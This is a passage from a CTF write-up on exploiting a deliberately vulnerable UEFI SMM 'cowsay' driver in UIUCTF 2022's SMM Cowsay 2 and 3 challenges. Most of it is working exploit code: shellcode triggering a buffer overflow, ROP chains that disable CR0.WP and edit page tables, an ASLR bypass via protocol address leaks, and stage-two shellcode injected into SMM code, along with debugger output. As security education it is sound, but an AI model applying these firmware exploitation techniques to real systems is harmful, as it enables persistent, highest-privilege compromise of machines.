    /* Communicate(mSmmCommunication, buffer, NULL) */
    mov rcx, {mSmmCommunication}
    mov rdx, {buffer}
    xor r8, r8
    mov rax, {Communicate}

    mov ebx, 0x0b0b0b0b
    mov esi, 0x01010101
    mov edi, 0x02020202
    mov ebp, 0x03030303
    mov r9 , 0x09090909
    mov r10, 0x10101010
    mov r11, 0x11111111
    mov r12, 0x12121212
    mov r13, 0x13131313
    mov r14, 0x14141414
    mov r15, 0x15151515
    call rax

    test rax, rax
    jnz fail
    ret

fail:
    ud2

data:
    .octa {gEfiSmmCowsayCommunicationGuid} /* Buffer->HeaderGuid */
    .quad {len(payload)}                   /* Buffer->MessageLength */
    /* payload will be appended here to serve as Buffer->Data */
''')

conn.sendline(code.hex().encode() + payload.hex().encode() + b'\ndone')
conn.interactive() # Let's see what happens
```

And now we can start the exploit and attach GDB using the following script:

```
$ cat script.gdb
target remote :1234

source gdb_plugin.py
add-all-symbols

break *(SmmCowsayHandler + 0x302)
continue
```

```
$ gdb -x script.gdb
...
Breakpoint 1, 0x0000000007ee92c5 in SmmCowsayHandler (CommBufferSize=<optimized out>, CommBuffer=0x69bb030, ...
(gdb) i r rax
rax            0x4141414141414141  4702111234474983745

(gdb) si
0x4141414141414141 in ?? ()

(gdb) x/100gx $rsp
0x7fb6a78:	0x0000000007ee92c7	0x0000000007ffa8d8
0x7fb6a88:	0x0000000007ff0bc5	0x00000000069bb030
0x7fb6a98:	0x0000000007fb6c38	0x0000000007fb6b80
...
...
...
0x7fb6b48:	0x00000000069bb018	0x0000000013131300
0x7fb6b58:	0x0000000014141414	0x0000000015151515
```

It seems like R13 (except the LSB), R14 and R15 somehow got spilled on the stack
at `rsp + 0xe0`. After returning from the `call rax` the code in
`SmmCowsayHandler` does:

```
(gdb) x/30i SmmCowsayHandler + 0x302
   0x7ee92c5 <SmmCowsayHandler+770>:	call   rax
   0x7ee92c7 <SmmCowsayHandler+772>:	test   bl,bl
   ... a bunch of useless stuff ...
   0x7ee92f7 <SmmCowsayHandler+820>:	add    rsp,0x40
   0x7ee92fb <SmmCowsayHandler+824>:	xor    eax,eax
   0x7ee92fd <SmmCowsayHandler+826>:	pop    rbx
   0x7ee92fe <SmmCowsayHandler+827>:	pop    rsi
   0x7ee92ff <SmmCowsayHandler+828>:	pop    rdi
   0x7ee9300 <SmmCowsayHandler+829>:	pop    r12
   0x7ee9302 <SmmCowsayHandler+831>:	pop    r13
   0x7ee9304 <SmmCowsayHandler+833>:	ret
```

So at the time of that last `ret` we would have the registers spilled on the
stack a lot closer. Very conveniently, amongst the gadgets we dumped, there is a
`ret 0x70` at `VariableSmm.efi + 0x8a49`. We can use this gadget to to move RSP
*exactly* on top of the spilled R14, giving us the possibility to execute one
more gadget of the form `pop rsp; ret`, which would get the new value for RSP
from the R15 value on the stack! After this, we fully control the stack and we
can write a longer ROP chain.

### Writing the real ROP chain

After flipping the stack and starting the real ROP chain, we'll need gadgets
for:

- Setting CR0 in order to be able to disable `CR0.WP` to be able to edit the
  page table.
- Write to memory at an arbitrary address to overwrite the page table entry for
  the flag address.
- Read from memory into a register to be able to get the flag.

All of these can be easily found with a bit of patience, since we have *a lot*
of gadgets on our hands.

Since addresses don't change, we don't really need to worry about walking the
page table: we can just find the address of the page table entry for
`0x44440000` once using GDB and then hardcode it in the exploit:

```
(gdb) set $lvl4_idx = (0x44440000 >> 12 + 9 + 9 + 9) & 0x1ff
(gdb) set $lvl3_idx = (0x44440000 >> 12 + 9 + 9) & 0x1ff
(gdb) set $lvl2_idx = (0x44440000 >> 12 + 9) & 0x1ff
(gdb) set $lvl1_idx = (0x44440000 >> 12) & 0x1ff
(gdb) set $lvl4_entry = *(unsigned long *)($cr3 + 8 * $lvl4_idx)
(gdb) set $lvl3_entry = *(unsigned long *)(($lvl4_entry & 0xffffffff000) + 8 * $lvl3_idx)
(gdb) set $lvl2_entry = *(unsigned long *)(($lvl3_entry & 0xffffffff000) + 8 * $lvl2_idx)

(gdb) set $lvl1_entry_addr = ($lvl2_entry & 0xffffffff000) + 8 * $lvl1_idx
(gdb) set $lvl1_entry      = *(unsigned long *)$lvl1_entry_addr

(gdb) printf "PTE at 0x%lx, value = 0x%016lx\n", $lvl1_entry_addr, $lvl1_entry

PTE at 0x7ed0200, value = 0x8000000044440066
```

Notice how `0x8000000044440066` has bit 63 set (NX) set and bits 0 and 1 unset
(not present, not writeable). We need to set bit 0 in order to mark the page as
present, so the value we want is `0x8000000044440067`.

Checking the value of CR0 from GDB we get `0x80010033`: turning OFF the WP bit
gives us `0x80000033`, so this is what we want to write into CR0 before trying
to edit the page table entry at `0x7ed0200`.

After finding the gadgets we need, this is what the real ROP chain looks like:

```python
ret_0x70 = 0x7F83000 + 0x8a49 # VariableSmm.efi + 0x8a49: ret 0x70
payload  = 'A'.encode('utf-16-le') * 200 + p64(ret_0x70)

real_chain = [
    # Unset CR0.WP
    0x7f8a184 , # pop rax ; ret
    0x80000033, # -> RAX
    0x7fcf70d , # mov cr0, rax ; wbinvd ; ret

    # Set PTE of flag page as present
    # PTE at 0x7ed0200, original value = 0x8000000044440066
    0x7f8a184         , # pop rax ; ret
    0x7ed0200         , # -> RAX
    0x7fc123d         , # pop rdx ; ret
    0x8000000044440067, # -> RDX
    0x7fc9385         , # mov dword ptr [rax], edx ; xor eax, eax ;
                        # pop rbx ; pop rbp ; pop r12 ; ret
    0x1337, # filler
    0x1337, # filler
    0x1337, # filler

    # Read flag into RAX and then let everything chain
    # crash to simply leak it from the register dump
    0x7ee8222 , # pop rsi ; ret (do not mess up RAX with sub/add)
    0x0       , # -> RSI
    0x7fc123d , # pop rdx ; ret (do not mess up RAX with sub/add)
    0x0       , # -> RDX
    0x7ee82fe , # pop rdi ; ret
    0x44440000, # -> RDI (flag address)
    0x7ff7b2c , # mov rax, qword ptr [rdi] ; sub rsi, rdx ; add rax, rsi ; ret
]
```

### Putting it all together

We can now write the real ROP chain into our allocated buffer (let's say at
`buffer + 0x800` just to be safe), load the gadget for flipping the stack into
R14, the address of the new stack (i.e. `buffer + 0x800`) into R15, and go for
the kill.

```python
# Transform real ROP chain into .quad directives to
# easyly embed it in the shellcode:
#
#   .quad 0x7f8a184
#   .quad 0x80000033
#    ...
real_chain_size = len(real_chain) * 8
real_chain      = '.quad ' + '\n.quad '.join(map(str, real_chain))

code = asm(f'''
    /* Copy data into allocated buffer */
    lea rsi, qword ptr [rip + data]
    mov rdi, {buffer}
    mov rcx, {0x18 + len(payload)}
    cld
    rep movsb

    /* Copy real ROP chain into buffer + 0x800 */
    lea rsi, qword ptr [rip + real_chain]
    mov rdi, {buffer + 0x800}
    mov rcx, {real_chain_size}
    cld
    rep movsb

    /* Communicate(mSmmCommunication, buffer, NULL) */
    mov rcx, {mSmmCommunication}
    mov rdx, {buffer}
    xor r8, r8
    mov rax, {Communicate}

    /* These two regs will spill on SMI stack */
    mov r14, 0x7fe5269         /* pop rsp; ret */
    mov r15, {buffer + 0x800}  /* -> RSP */
    call rax

    test rax, rax
    jnz fail
    ret

fail:
    ud2

real_chain:
    {real_chain}

data:
    .octa {gEfiSmmCowsayCommunicationGuid} /* Buffer->HeaderGuid */
    .quad {len(payload)}                   /* Buffer->MessageLength */
    /* payload will be appended here to serve as Buffer->Data */
''')

conn.sendline(code.hex().encode() + payload.hex().encode() + b'\ndone')
conn.interactive()
```

Result:

```
Running...
!!!! X64 Exception Type - 0D(#GP - General Protection)  CPU Apic ID - 00000000 !!!!
ExceptionData - 0000000000000000
RIP  - AFAFAFAFAFAFAFAF, CS  - 0000000000000038, RFLAGS - 0000000000000002
RAX  - 547B667463756975, RCX - 0000000000000000, RDX - 0000000000000000
...
```

Surely enough, that value in RAX decodes to `uiuctf{T`, which is the test flag
provided in the `handout/run/region4` file. We could find some more gadgets to
dump more bytes, and we could even try using IO ports to actually write the flag
out on the screen, but wrapping the exploit up into a function and running it a
couple more times seemed way easier to me (*I was also not sure about how to
output to the screen, e.g. which function or which IO port to use*).

```python
flag = ''
for off in range(0, 0x100, 8):
    chunk = expl(0x44440000 + off)
    flag += chunk.decode()
    log.success(flag)

    if '}' in flag:
        break
```

```
[*] Leaking 8 bytes at 0x44440000...
[+] uiuctf{d
[*] Leaking 8 bytes at 0x44440008...
[+] uiuctf{dont_try_
...
[*] Leaking 8 bytes at 0x44440030...
[+] uiuctf{dont_try_this_at_home_I_mean_at_work_5dfbf3eb}
```

---

# SMM Cowsay 3

**Full exploit**: [expl_smm_cowasy_3.py][expl3]

> We fired that engineer. Unfortunately, other engineers refused to touch this
> code, but instead suggested to integrate some ASLR code found online.
> Additionally, we hardened the system with SMM_CODE_CHK_EN and kept DEP on. Now
> that we have the monster combination of ASLR+DEP, we should surely be secure,
> right?

Things get a bit more complicated now, but honestly not that much. The code for
`SmmCowsay.efi` is unchanged, so the vulnerability is still the same, but the
EDK2 and QEMU patches now apply two major modifications:

1. `SMM_CODE_CHK_EN` has been enabled: this is a bit in the
   `MSR_SMM_FEATURE_CONTROL` MSR, which controls whether SMM can execute code
   outside of the ranges defined by two other MSRs: `IA32_SMRR_PHYSBASE` and
   `IA32_SMRR_PHYSMASK` (basically outside SMRAM). The "Lock" bit of
   `MSR_SMM_FEATURE_CONTROL` is also set in QEMU when setting `SMM_CODE_CHK_EN`,
   so this check cannot be disabled.

   This isn't really a problem since we weren't really executing any code
   outside SMRAM. We can already get what we want with a simple ROP chain that
   utilizes code already present in SMRAM, assuming we find the right gadgets.

2. ASLR has been added to EDK2 (original patches from
   [jyao1/SecurityEx][gh-edk2-securityex] with some slight changes): now every
   single driver is loaded at a different address that changes each boot, with
   10 bits of entropy taken using [the `rdrand` instruction][x86-rdrand].
   Needless to say, this makes using hardcoded addresses like we did for the
   previous exploit impossible.


## Exploitation

### Defeating ASLR

How do we leak some SMM address in order to defeat ASLR? Well, there are a bunch
of protocols registered by EDK2 drivers. Each protocol has its own GUID, and
calling `BootServices->LocateProtocol` with a valid GUID will return a pointer
to the protocol struct (if present), *which resides in the driver implementing
the protocol!* This allows us to leak the base address (after a simple
subtraction) of any driver implementing a protocol that is registered at the
time of the execution of our code.

If we take a look at [the file `MdePkg/MdePkg.dec`][edk2-MdePkg] in the EDK2
source code we have a bunch of GUIDs for different protocols. Without even
wasting time inspecting other parts of the source code, we can dump them all and
try requesting every single one of them, until we find an address that looks
interesting.

Again, patching the `run.sh` script to let QEMU dump EDK2 debug output to a file
like we did for SMM Cowsay 2, we can find SMBASE, which I assumed as the start
address of SMRAM when writing the exploit. *In theory, SMRAM can expand before
and after SMBASE, which according to Intel Doc just marks the base address used
to find the entry point for the SMI handler and the save state area.*

```
CPU[000]  APIC ID=0000  SMBASE=07FAF000  SaveState=07FBEC00  Size=00000400
```

Now, using the same code we used for both the previous challenges, we can check
every single protocol GUID listed in `MdePkg/MdePkg.dec` and see if the address
returned is after SMBASE:

```python
with open('debug.log') as f:
    for line in f:
        if line.startswith('CPU[000]  APIC ID=0000  SMBASE='):
            smbase = int(line[31:31 + 8], 16)

# Manually or programmatically extract GUIDs from MdePkg/MdePkg.dec

for guid in guids:
    code = asm(f'''
        /* LocateProtocol(&guid, NULL, &protocol) */
        lea rcx, qword ptr [rip + guid]
        xor rdx, rdx
        lea r8, qword ptr [rip + protocol]
        mov rax, {LocateProtocol}
        call rax

        test rax, rax
        jnz fail

        mov rax, qword ptr [rip + protocol]
        ret

    fail:
        ud2

    guid:
        .octa {guid}
    protocol:
    ''')
    conn.sendline(code.hex().encode() + b'\ndone')

    conn.recvuntil(b'RAX: 0x')
    proto = int(conn.recvn(16), 16)

    if proto > smbase:
        log.info('Interesting protocol: GUID = 0x%x, ADDR = 0x%x', guid, proto)
```

Surely enough, by letting the script run for enough time, we find that
`gEfiSmmConfigurationProtocolGuid` returns a pointer to a protocol at a nice
address. Looking at the `debug.log` for loaded drivers we can see that this
address is inside the `PiSmmCpuDxeSmm.efi` SMM driver, and a simple subtraction
gives us its base address.

### Finding ROP gadgets

Now we can take a look at the gadgets in `PiSmmCpuDxeSmm.efi`. As it turns out,
we were lucky enough:

- Looking from GDB, we still have R13, R14 and R15 spilled on the SMI stack at
  the exact same offset.
- We can move the stack pointer forward: `ret 0x6d`
- We can flip the stack: `pop rsp; ret`
- We can pop RAX and other registers: `pop rax ; pop rbx ; pop r12 ; ret`
- We can set CR0: `mov cr0, rax ; wbinvd ; ret`
- We have a write-what-where primitive: `mov qword ptr [rbx], rax ; pop rbx ; ret`

We do not have a lot more nice gadgets to work with, so this time instead of
writing the entire exploit using ROP, after disabling CR0.WP, we will just use
the write-what-where gadget to overwrite a piece of `.text` of
`PiSmmCpuDxeSmm.efi` with a stage 2 shellcode, and then simply jump to it.

The only slightly annoying part is the `ret 0x6d` gadget to move the stack
forward: it will result in a misaligned stack, landing in the 2 most significant
bytes of the R13 value spilled on the stack. This isn't a real problem as
thankfully the CPU (or better, QEMU) does not seem to care about the unaligned
stack pointer. We'll simply have to do some bit shifting to put values on the
stack nicely using R{13,14,15}.

```python
# SmmConfigurationProtocol leaked using LocateProtocol(gEfiSmmConfigurationProtocolGuid)
PiSmmCpuDxeSmm_base = SmmConfigurationProtocol - 0x16210
PiSmmCpuDxeSmm_text = PiSmmCpuDxeSmm_base + 0x1000

log.success('SmmConfigurationProtocol    @ 0x%x', SmmConfigurationProtocol)
log.success('=> PiSmmCpuDxeSmm.efi       @ 0x%x', PiSmmCpuDxeSmm_base)
log.success('=> PiSmmCpuDxeSmm.efi .text @ 0x%x', PiSmmCpuDxeSmm_text)

new_smm_stack   = buffer + 0x800
ret_0x6d        = PiSmmCpuDxeSmm_base + 0xfc8a  # ret 0x6d
flip_stack      = PiSmmCpuDxeSmm_base + 0x3c1c  # pop rsp ; ret
pop_rax_rbx_r12 = PiSmmCpuDxeSmm_base + 0xd228  # pop rax ; pop rbx ; pop r12 ; ret
mov_cr0_rax     = PiSmmCpuDxeSmm_base + 0x10a7d # mov cr0, rax ; wbinvd ; ret
write_primitive = PiSmmCpuDxeSmm_base + 0x3b8f  # mov qword ptr [rbx], rax ; pop rbx ; ret

payload  = 'A'.encode('utf-16-le') * 200 + p64(ret_0x6d)
```

### Second stage shellcode

As we just said we will make our ROP chain with a few gadgets that will write a
second stage shellcode into the `.text` of `PiSmmCpuDxeSmm.efi` and then jump to
it. This shellcode will have to walk the page table (this time we cannot
pre-compute the address of the PTE because of ASLR), set the present bit on the
PTE and then read the flag into (one or more) registers.

```python
stage2_shellcode = asm(f'''
    movabs rbx, 0xffffffff000

    /* Walk page table */
    mov rax, cr3
    mov rax, qword ptr [rax]
    and rax, rbx
    mov rax, qword ptr [rax + 8 * 0x1]
    and rax, rbx
    mov rax, qword ptr [rax + 8 * 0x22]
    and rax, rbx
    mov rbx, rax
    mov rax, qword ptr [rax + 8 * 0x40]

    /* Set present bit */
    or al, 1
    mov qword ptr [rbx + 8 * 0x40], rax

    /* Read flag and die so regs get dumped, GG! */
    movabs rax, 0x44440000
    mov rax, qword ptr [rax]
    ud2
''')
```

Again, we can run the exploit multiple times changing that `0x44440000` to leak
8 bytes at a time and obtain the full flag.

### Putting it all together

Now we can build the ROP chain and send the exploit in the same way we did for
SMM Cowsay 2:

```python
real_chain = [
    # Unset CR0.WP
    pop_rax_rbx_r12, # pop rax ; pop rbx ; pop r12 ; ret
    0x80000033     , # -> RAX
    0xdeadbeef     , # filler
    0xdeadbeef     , # filler
    mov_cr0_rax    , # mov cr0, rax ; wbinvd ; ret
]

# Now that CR0.WP is unset, we can just patch SMM code and jump to it!
# Make the ROP chain write the stage 2 shellcode at PiSmmCpuDxeSmm_text
# 8 bytes at a time, then jump into it
for i in range(0, len(stage2_shellcode), 8):
    chunk = stage2_shellcode[i:i + 8].ljust(8, b'\x90')
    chunk = u64(chunk)

    real_chain += [
        pop_rax_rbx_r12        , # pop rax ; pop rbx ; pop r12 ; ret
        chunk                  , # -> RAX
        PiSmmCpuDxeSmm_text + i, # -> RBX
        0xdeadbeef             ,
        write_primitive        , # mov qword ptr [rbx], rax ; pop rbx ; ret
        0xdeadbeef
    ]

real_chain += [PiSmmCpuDxeSmm_text]

# Transform real ROP chain into .quad directives to embed in the shellcode:
#   .quad 0x7f8a184
#   .quad 0x80000033
#    ...
real_chain_size = len(real_chain) * 8
real_chain      = '.quad ' + '\n.quad '.join(map(str, real_chain))
```

The asm of the code we send to the server is the same as for the previous
challenge, so I am leaving most of it out. The only thing that changes is that
we now have to do some math to put the gadget to flip the stack and the new
stack address in the right place since the `ret 0x6d` will misalign the stack:

```python
code = asm(f'''
    /* ... */

    movabs r13, {(flip_stack << 40) & 0xffffffffffffffff}
    movabs r14, {((flip_stack >> 24) | (new_smm_stack << 40)) & 0xffffffffffffffff}
    movabs r15, {new_smm_stack >> 24}
    call rax

    /* ... */
''')
```

Now just run the exploit in a loop as we did for SMM Cowsay 2 and leak the
entire flag: `uiuctf{uefi_is_hard_and_vendors_dont_care_1403c057}`. GG!

---

GG to you too if you made it this far :O. All in all, this was very fun and
interesting set of challenges that made me learn a lot about x86 SMM and UEFI.
Hope you enjoyed the write-up.


[smm1]: #smm-cowsay-1
[smm2]: #smm-cowsay-2
[smm3]: #smm-cowsay-3
[expl1]: https://github.com/TowerofHanoi/towerofhanoi.github.io/blob/master/writeups_files/uiuctf-2022_smm-cowsay/expl_smm_cowasy_1.py
[expl2]: https://github.com/TowerofHanoi/towerofhanoi.github.io/blob/master/writeups_files/uiuctf-2022_smm-cowsay/expl_smm_cowasy_2.py
[expl3]: https://github.com/TowerofHanoi/towerofhanoi.github.io/blob/master/writeups_files/uiuctf-2022_smm-cowsay/expl_smm_cowasy_3.py

[tweet]:                               https://twitter.com/MeBeiM/status/1554849894237609985
[uiuctf]:                              https://ctftime.org/event/1600/
[uiuctf-archive]:                      https://2022.uiuc.tf/challenges
[author]:                              https://github.com/zhuyifei1999
[wiki-smm]:                            https://en.wikipedia.org/wiki/System_Management_Mode
[intel-sdm]:                           https://www.intel.com/content/www/us/en/developer/articles/technical/intel-sdm.html
[uefi-spec]:                           https://uefi.org/specifications
[uefi-spec-pdf]:                       https://uefi.org/sites/default/files/resources/UEFI_Spec_2_9_2021_03_18.pdf
[man-cowsay]:                          https://manned.org/cowsay.1
[man-pahole]:                          https://manned.org/pahole.1
[x64-call]:                            https://docs.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170
[x86-rsm]:                             https://www.felixcloutier.com/x86/rsm
[x86-rdrand]:                          https://www.felixcloutier.com/x86/rdrand
[gh-pwntools]:                         https://github.com/Gallopsled/pwntools
[gh-ropgadget]:                        https://github.com/JonathanSalwan/ROPgadget
[gh-edk2]:                             https://github.com/tianocore/edk2
[gh-edk2-securityex]:                  https://github.com/jyao1/SecurityEx
[gh-qemu]:                             https://github.com/qemu/qemu
[qemu-memtxattrs]:                     https://github.com/qemu/qemu/blob/v7.0.0/include/exec/memattrs.h#L35
[edk2-SystemTable]:                    https://edk2-docs.gitbook.io/edk-ii-uefi-driver-writer-s-guide/3_foundation/33_uefi_system_table
[edk2-SmiHandlerRegister]:             https://github.com/tianocore/edk2/blob/7c0ad2c33810ead45b7919f8f8d0e282dae52e71/MdeModulePkg/Core/PiSmmCore/Smi.c#L213
[edk2-EfiRuntimeServicesData]:         https://github.com/tianocore/edk2/blob/0ecdcb6142037dd1cdd08660a2349960bcf0270a/BaseTools/Source/C/Include/Common/UefiMultiPhase.h#L25
[edk2-SmmCommunicationCommunicate]:    https://github.com/tianocore/edk2/blob/1774a44ad91d01294bace32b0060ce26da2f0140/MdeModulePkg/Core/PiSmmCore/PiSmmIpl.c#L110
[edk2-EFI_SMM_COMMUNICATION_PROTOCOL]: https://github.com/tianocore/edk2/blob/1774a44ad91d01294bace32b0060ce26da2f0140/MdeModulePkg/Core/PiSmmCore/PiSmmIpl.c#L267
[edk2-copy-msg]:                       https://github.com/tianocore/edk2/blob/1774a44ad91d01294bace32b0060ce26da2f0140/MdeModulePkg/Core/PiSmmCore/PiSmmIpl.c#L547
[edk2-smi-entry]:                      https://github.com/tianocore/edk2/blob/1774a44ad91d01294bace32b0060ce26da2f0140/UefiCpuPkg/PiSmmCpuDxeSmm/X64/SmiEntry.nasm#L89
[edk2-gadget]:                         https://github.com/tianocore/edk2/blob/1774a44ad91d01294bace32b0060ce26da2f0140/MdePkg/Library/BaseLib/X64/LongJump.nasm#L54
[edk2-MdePkg]:                         https://github.com/tianocore/edk2/blob/1774a44ad91d01294bace32b0060ce26da2f0140/MdePkg/MdePkg.dec
[edk2-buffer-check]:                   https://github.com/tianocore/edk2/blob/7c0ad2c33810ead45b7919f8f8d0e282dae52e71/MdePkg/Library/SmmMemLib/SmmMemLib.c#L163
[edk2-gdt]:                            https://github.com/tianocore/edk2/blob/2812668bfc121ee792cf3302195176ef4a2ad0bc/UefiCpuPkg/PiSmmCpuDxeSmm/X64/SmiException.nasm#L31
